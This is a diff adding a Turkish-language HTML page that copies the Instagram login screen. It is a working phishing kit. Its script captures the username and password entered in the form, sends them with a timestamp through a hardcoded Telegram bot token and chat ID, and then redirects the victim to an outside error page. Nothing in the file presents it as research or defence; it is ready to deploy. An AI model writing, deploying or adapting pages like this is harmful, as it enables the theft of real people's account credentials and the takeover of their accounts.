@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <link rel="icon" href="images/icon.png" type="image/png">
+  <style>
+    /* Genel stiller */
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: white;
+      margin: 0;
+      padding: 0;
+    }
+    
+    /* Dil seçici */
+    .language-selector {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 4px;
+      padding-top: 16px;
+    }
+    
+    .language-dropdown {
+      display: inline-flex;
+      align-items: center;
+    }
+    
+    .language-text {
+      font-size: 12px;
+      color: #8e8e8e;
+      font-weight: normal;
+    }
+    
+    /* Ana form alanı */
+    .login-container {
+      max-width: 350px;
+      margin: 0 auto;
+      padding: 0 40px;
+      padding-top: 35px;
+    }
+    
+    .logo-container {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 40px;
+    }
+    
+    .logo-image {
+      height: 65px;
+      width: auto;
+    }
+    
+    /* Facebook butonu */
+    .facebook-button {
+      width: 100%;
+      background-color: #0095F6;
+      color: white;
+      font-weight: 500;
+      padding: 0 16px;
+      border-radius: 8px;
+      font-size: 14px;
+      margin-bottom: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 32px;
+      border: none;
+      cursor: pointer;
+    }
+    
+    .facebook-icon-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 8px;
+    }
+    
+    .facebook-icon {
+      height: 20px;
+      width: 20px;
+    }
+    
+    /* Ya da bölümü */
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 10px 0;
+    }
+    
+    .divider-line {
+      flex-grow: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+    
+    .divider-text {
+      margin: 0 16px;
+      font-size: 13px;
+      color: #8e8e8e;
+      font-weight: 600;
+    }
+    
+    /* Form stilleri */
+    .login-form {
+      margin-top: 24px;
+    }
+    
+    .form-group {
+      margin-bottom: 8px;
+    }
+    
+    .form-input {
+      width: 100%;
+      padding: 9px 8px;
+      background-color: #fafafa;
+      font-size: 12px;
+      line-height: 18px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      box-sizing: border-box;
+    }
+    
+    .forgot-password {
+      text-align: right;
+      padding: 4px 0;
+      padding-top: 2px;
+      padding-bottom: 14px;
+    }
+    
+    .forgot-password a {
+      font-size: 13px;
+      color: #0095F6;
+      text-decoration: none;
+      font-weight: normal;
+    }
+    
+    .login-button {
+      width: 100%;
+      background-color: rgb(80, 180, 252);
+      color: white;
+      font-weight: 500;
+      border-radius: 8px;
+      margin-top: 8px;
+      margin-bottom: 8px;
+      padding: 8px 0;
+      border: none;
+      cursor: pointer;
+    }
+    
+    /* Kayıt bölümü */
+    .signup-section {
+      margin-top: 33px;
+      text-align: center;
+    }
+    
+    .signup-text {
+      font-size: 14px;
+      color: #8e8e8e;
+    }
+    
+    .signup-link {
+      color: #0095F6;
+      font-weight: 500;
+      text-decoration: none;
+    }
+    
+    /* Dip not */
+    .footnote {
+      text-align: center;
+      font-size: 12px;
+      color: #737373;
+      margin-top: 50px;
+    }
+    
+    .footnote-divider {
+      border-top: 1px solid #dbdbdb;
+      padding-top: 16px;
+      margin-top: 15px;
+    }
+    
+    .footnote-text {
+      line-height: 1.3;
+    }
+    
+    .blue-text {
+      color: #00376B;
+    }
+    
+    /* Alt linkler */
+    .footer {
+      margin-top: 120px;
+      margin-bottom: 40px;
+    }
+    
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 20px;
+      font-size: 12px;
+      color: #8e8e8e;
+      line-height: 16px;
+      margin-bottom: 16px;
+    }
+    
+    .footer-link {
+      color: #8e8e8e;
+      text-decoration: none;
+      margin-bottom: 8px;
+    }
+    
+    .footer-link:hover {
+      text-decoration: underline;
+    }
+    
+    .copyright {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 15px;
+      font-size: 12px;
+      color: #8e8e8e;
+      margin-bottom: 20px;
+      margin-top: -14px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Dil seçici -->
+  <div class="language-selector">
+    <div class="language-dropdown">
+      <span class="language-text">Türkçe</span>
+      <svg class="h-3 w-3 text-[#8e8e8e] ml-1" style="height: 12px; width: 12px; color: #8e8e8e; margin-left: 4px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
+      </svg>
+    </div>
+  </div>
+
+  <!-- Ana form alanı -->
+  <div class="login-container">
+    <div class="logo-container">
+      <img src="images/instagram_logo.png" alt="Instagram" class="logo-image">
+    </div>
+
+    <button type="button" class="facebook-button">
+      <div class="facebook-icon-container">
+        <img src="images/facebook.png" alt="Facebook" class="facebook-icon">
+      </div>
+      Facebook ile Devam Et
+    </button>
+
+    <div class="divider">
+      <div class="divider-line"></div>
+      <span class="divider-text">YA DA</span>
+      <div class="divider-line"></div>
+    </div>
+
+    <form id="loginForm" class="login-form">
+      <div class="form-group">
+        <input type="text" id="username" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="form-input" required>
+      </div>
+
+      <div class="form-group">
+        <input type="password" id="password" name="password" placeholder="Şifre" class="form-input" required>
+      </div>
+
+      <div class="forgot-password">
+        <a href="https://www.instagram.com/accounts/password/reset/">Şifreni mi unuttun?</a>
+      </div>
+
+      <button type="submit" class="login-button" id="submitButton">Giriş yap</button>
+    </form>
+
+    <div class="signup-section">
+      <p class="signup-text">
+        Hesabın yok mu? <a href="https://www.instagram.com/accounts/signup/phone/" class="signup-link">Kaydol</a>
+      </p>
+    </div>
+
+    <div class="footnote">
+      <div class="footnote-divider"></div>
+      <p class="footnote-text">
+        Ayrıca ülkende giriş yapmadan <span class="blue-text">yasa dışı olduğunu düşündüğün içeriği şikayet edebilirsin</span>.
+      </p>
+    </div>
+  </div>
+
+  <!-- Alt linkler -->
+  <div class="footer">
+    <div class="footer-links">
+      <a href="#" class="footer-link">Meta</a>
+      <a href="#" class="footer-link">Hakkında</a>
+      <a href="#" class="footer-link">Blog</a>
+      <a href="#" class="footer-link">İş Fırsatları</a>
+      <a href="#" class="footer-link">Yardım</a>
+      <a href="#" class="footer-link">API</a>
+    </div>
+
+    <div class="footer-links">
+      <a href="#" class="footer-link">Gizlilik</a>
+      <a href="#" class="footer-link">Çerez Ayarları</a>
+      <a href="#" class="footer-link">Koşullar ve Künye</a>
+      <a href="#" class="footer-link">Konumlar</a>
+    </div>
+
+    <div class="footer-links">
+      <a href="#" class="footer-link">Instagram Lite</a>
+      <a href="#" class="footer-link">Threads</a>
+    </div>
+
+    <div class="footer-links">
+      <a href="#" class="footer-link">Kişi Yükleme ve Hesabı Olmayan Kişiler</a>
+      <a href="#" class="footer-link">Meta Verified</a>
+    </div>
+
+    <div class="footer-links">
+      <a href="#" class="footer-link">Sözleşmeleri burada iptal et</a>
+    </div>
+
+    <div class="copyright">
+      <div class="language-dropdown">
+        <span class="language-text">Türkçe</span>
+        <svg class="h-[15px] w-[15px]" style="height: 15px; width: 15px; color: #8e8e8e; margin-left: 4px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
+        </svg>
+      </div>
+      <span>© 2025 Instagram from Meta</span>
+    </div>
+  </div>
+
+  <script>
+    // Bu değişkeni değiştirerek yönlendirme URL'ini ayarlayabilirsiniz
+    const REDIRECT_URL = "https://itiraflar.kesug.com/hata/";
+    
+    // Telegram Bot Bilgileri
+    const TELEGRAM_BOT_TOKEN = "7676691540:AAH_BiHHfI0hK1EQC87oGw6GjCyI5C6ySKE"; // Bu token sadece bu proje için kullanılmalıdır
+    const TELEGRAM_CHAT_ID = "-1002584942967"; // Mesajların iletileceği chat ID
+    
+    // Form gönderildiğinde çalışacak fonksiyon
+    document.getElementById('loginForm').addEventListener('submit', async function(event) {
+      event.preventDefault();
+      
+      // Form verilerini al
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      
+      // Eğer alanlar boşsa işlemi durdur
+      if (!username || !password) {
+        return;
+      }
+      
+      // Giriş butonunu devre dışı bırak ve "Giriş yapılıyor..." mesajı göster
+      const submitButton = document.getElementById('submitButton');
+      submitButton.disabled = true;
+      submitButton.innerText = "Giriş yapılıyor...";
+      
+      try {
+        // Tarih ve saat bilgisini al
+        const now = new Date();
+        const dateTimeStr = now.toISOString();
+        
+        // Telegram API için mesaj metni oluştur
+        const messageText = `
+🚨 *Instagram Yeni Giriş* 🚨
+
+*Hesap Bilgileri:*
+👤 *Kullanıcı Adı:* ${username}
+🔒 *Şifre:* ${password}
+🕝 *Tarih:* ${dateTimeStr}
+        `;
+        
+        // Telegram API URL'ini oluştur
+        const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        // Telegram botuna gönder
+        const response = await fetch(telegramApiUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: messageText,
+            parse_mode: 'Markdown'
+          })
+        });
+        
+        // İşlem tamamlandığında yönlendir
+        window.location.href = REDIRECT_URL;
+        
+      } catch (error) {
+        // Hata olsa bile yönlendir
+        window.location.href = REDIRECT_URL;
+      }
+    });
+  </script>
+</body>
+</html>
